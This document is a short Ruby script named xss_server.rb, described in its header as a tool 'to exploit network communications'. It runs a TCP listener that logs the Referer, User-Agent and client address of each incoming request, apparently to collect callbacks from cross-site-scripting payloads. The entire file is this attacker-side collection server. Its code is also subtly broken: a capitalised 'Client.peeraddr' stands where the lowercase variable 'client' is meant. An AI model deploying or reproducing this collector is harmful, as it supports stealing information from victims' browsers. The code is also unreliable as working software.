#!/usr/bin/ruby
#=========================================================================================
# xss_server.rb
# Ronald Wochner 
# Tue May 30 09:00:20 PDT 2017
# Version 1
# Simple ruby script to exploit network communications
#=========================================================================================

require 'socket'
banner = "HTTP/1.1 200 OK
Date: Thu, 1 Apr 1977 01:23:45 GMT
Content-Length: 0
Connection: close
Content-Type: text/html\n\n"
server = TCPServer.open('localhost',8080)
loop {
    client = server.accept
    req = client.recv(1024).split("\r\n")
    headers = {}
    req.each do |l|
    k,v = l.split(':',2)
    headers[k] = v
    end
    print "#{Time.now} - #{Client.peeraddr.last}\n"
    print "\t#{headers['Referer']} - #{headers['User-Agent']}\n"
    client.puts banner
    client.close
}

